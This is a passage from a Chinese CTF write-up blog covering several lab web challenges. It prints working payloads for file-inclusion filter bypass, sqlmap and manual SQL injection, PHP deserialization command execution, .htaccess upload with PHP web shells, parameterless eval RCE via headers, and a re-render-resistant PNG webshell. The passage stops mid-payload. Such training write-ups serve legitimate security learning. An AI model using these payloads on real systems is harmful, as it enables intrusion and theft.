class="hljs-params"></span>) &#123;<span class="hljs-comment">//下面这部分函数用来返回flag</span><br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>那就直接伪造一个包好了：<code>POST</code>方法<code>api.php</code>，<code>host</code>就是靶机地址，<code>Content-Type:application/json</code>，注意POST的数据要是JSON格式而且空一行，其它任意:</p><p><img src="/img/youxi2.png" alt="youxi2"></p><p>如果数据包格式有问题它会提示<code>&#123;&quot;message&quot;:&quot;so low score&quot;&#125;</code></p><p>看了官方<code>wp</code>发现还有一种方法：直接打开控制台传<code>gameScore=9999999999</code>，然后等游戏结束：</p><p><img src="/img/youxi3.png" alt="youxi3"></p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>包含也有危害？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br><br></code></pre></td></tr></table></figure><p>目测要用伪协议读<code>flag.php</code>的源码，没过滤<code>filter</code>但过滤了<code>base|rot/</code>而且是<code>/i</code>模式，不过没啥影响除了<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>还有很多其它方法。</p><p>之前攻防世界正好做过一个类似的，payload:</p><p><code>?file=php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php</code></p><p>源码是这个东西：</p><p><code>&lt;?php //flag&#123;af954c6a-1ac4-4e23-a235-fc4108a03783&#125;</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>虽然使用<code>sqlmap</code>是没有灵魂的，但我还是用了~</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 --current-db<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf --tables<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag --<span class="hljs-built_in">columns</span><br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag -C flag --dump<br></code></pre></td></tr></table></figure><p><code>flag:flag&#123;76715552-3304-4be1-b5e7-235d60421e41&#125;</code></p><p>后面看了下wp，因为太久没做这种手注了也试了试：</p><p>先判断数字型还是字符型注入：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">--+</span>    正常回显，初步猜测字符型注入<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; And <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">--+</span>   正常回显，字符型注入  <span class="hljs-comment">// and 被过滤了，试了试AND结果发现成功绕过</span><br>如果想在URL中用#这个注释符要编码成<span class="hljs-operator">%</span><span class="hljs-number">23</span>,太久没做SQL注入了，一开始把这茬忘了。<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; oRdeR by <span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   判断几列<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=-</span><span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   判断回显位，这五个数字同时回显<br>后面就是正常手注过程。<br>一开始以为直接用preg_match的 <span class="hljs-operator">/</span>i模式把大小写都正则匹配掉了，后面发现可以用大小写绕过。本来还想尝试ASCII编码绕过，弄了很久都没成功，找了下发现这种方式在某些版本的mysql中不能用了。。<br>https<span class="hljs-operator">:</span><span class="hljs-comment">//xz.aliyun.com/t/10594#toc-6</span><br></code></pre></td></tr></table></figure><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-comment">// private属性，序列化后会在属性前后分别加空(\00,转成URL%00)，构建payload要用rawurlencode</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) //<span class="hljs-title">__destruct</span>魔术方法，反序列化自动调用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//简单的过滤，想读文件的化可以用c&#x27;&#x27;at，ca$&#123;Z&#125;t等绕过</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//看看当前文件夹下</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//当前文件夹下结果：index.php</span><br></code></pre></td></tr></table></figure><p><img src="/img/unser1.png" alt="unser1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>; <span class="hljs-comment">//看了wp发现直接用head读也行</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;aa2dff68-42ce-46b0-a7d7-bb1d8a524896&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/img/upload2.png" alt="upload2"></p><p>肯定比week1过滤更严格了，上传htaccess.发现上传成功，内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test1.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>再上传<code>test1.png</code>，配置文件的存在可以把<code>test1.png</code>当成<code>php</code>文件，以构造一句话木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;viper&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;notbad&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传路径直接回显就不用<code>F12</code>去找了，可以先访问一下看是否访问成功，然后直接用蚁剑连就能拿<code>flag</code>：</p><p><code>flag&#123;99c580dd-c75e-41f2-89da-4741ab19f655&#125;</code></p><p>后面看wp知道它是检查了文件内容：<code>&lt;?</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>进环境发现是敏感信息泄露，直接用<code>dirsearch</code>扫：</p><p><code>dirsearch -u http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/RCE1.png" alt="RCE1"></p><p><code>.git</code>泄露，切换成根用户<code>python2 GitHack.py http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/.git</code></p><p>发现两个文件，一个<code>index.php</code>一个<code>bo0g1pop.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有个<code>((?R)?\)</code>，典型无参数RCE。</p><p>无参数RCE用的比较多的方法有<code>getallheaders()</code>，<code>get_defined_var()</code>,<code>session_id</code>。这题过滤了<code>get_defined_vars</code>，所以尝试用另外两种。</p><p>先<code>print_r(getallheaders())</code>看看以数组形式返回的包头是什么顺序的，正序还是倒叙？都返回哪些？</p><p><code>/bo0g1pop.php/?star=print_r(getallheaders());</code></p><p><img src="/img/rce22.png" alt="rce22"></p><p>正序回显以上内容，构建<code>payload</code>:</p><p><code>?star=eavl(next(getallheaders()));</code> 并把User-Agent头改成<code>system(&#39;ls&#39;);</code></p><p><img src="/img/rce4.png" alt="rce4"></p><p><img src="/img/rce3.png" alt="rce3"></p><p>后面命令改成<code>cat /flag</code>即可</p><p>虽然Host头第一位就回显了，但不能通过改Host头去执行命令，否则会弹400。或者利用<code>array_reverse</code>改最后回显那个<code>X-Forwarded-Proto</code>头也行</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week2</title>
    <link href="/2023/10/01/%5BWeek%202%5D%20ez_upload/"/>
    <url>/2023/10/01/%5BWeek%202%5D%20ez_upload/</url>
    
    <content type="html"><![CDATA[<p>0xGame第二周，在师傅已经给了大量提示的情况下只做出两个题:(</p><span id="more"></span><hr><h3 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h3><p>根据题目猜测任意文件上传，先打开题目的附件看看有啥东西，发现会对上传的文件利用<code>imagecreatefrom点点点()</code>和<code>image点点点()</code>进行二次渲染，主要部分如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//获得文件类型，content-type，上传一句话修改文件类型即可绕狗</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//刚刚上传的GIF，给source</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//同上</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//同上</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION); <span class="hljs-comment">//获得文件后缀，当出现多个 . 时，结果为最后一个 . 后面的内容。</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>; <span class="hljs-comment">//将文件原始名md5加密后和user_dir拼接，后面加个.后缀。这东西作为文件的存储路径</span><br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//再次检验文件类型</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<span class="hljs-comment">//将$source保存到$filepath中，</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>: <span class="hljs-comment">//同上</span><br>        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<span class="hljs-comment">//同上</span><br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>去网上查了有关二次渲染绕过的资料，发现有些题目是二次渲染配合<code>include</code>函数再上传图片马，但这题没给<code>include</code>函数？根据师傅的提示搜索了生成用于绕过二次渲染的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>放本地运行一下，生成<code>1.png</code>，放到HexCmp下看看：</p><p><img src="/img/ul1.png" alt="ul1"></p><p>有这么个东西：</p><p><code>&lt;?=$_GET[0]($_POST[1]);?&gt;//GET0传函数名，POST1传参数</code></p><p>先后缀改成<code>php</code>，上传时抓包把content-type字段改成<code>image/png</code>，发现上传成功，访问URL：</p><p><img src="/img/ul2.png" alt="ul2"></p><p>成功，<code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=ls;</code>，先看当前目录下的文件：</p><p><img src="/img/ul3.png" alt="ul3"></p><p><code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=ls /;</code>，看根目录下的文件：</p><p><img src="/img/ul4.png" alt="ul4"></p><p><code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=cat /flag;</code>，得到<code>flag</code>:</p><p><code>0xGame&#123;4611f622-8577-4ac4-8f85-0b787730800c&#125;</code></p><h3 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h3><p><code>url:http://120.27.148.152:50021/?order=email</code>，师傅提示是堆叠注入，而且直接<code>select flag from flag</code>就能拿答案。</p><p>给了附件，看下源码里黑名单都有啥：</p><p><code>blacklist = [&#39;select&#39;, &#39;update&#39;, &#39;insert&#39;, &#39;delete&#39;, &#39;database&#39;, &#39;table&#39;, &#39;column&#39;, &#39;alter&#39;, &#39;create&#39;, &#39;drop&#39;, &#39;and&#39;, &#39;or&#39;, &#39;xor&#39;, &#39;if&#39;, &#39;else&#39;, &#39;then&#39;, &#39;where&#39;]</code></p><p><code>?order=id;show tables</code>这种没法用了，根据师傅提示可以使用<code>prepare</code>和<code>execute</code>结合执行，有：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>));<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br></code></pre></td></tr></table></figure><p>但select被过滤掉了，空格好像也不能直接用？借助<code>char()</code>函数直接把第一段全转成字符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span 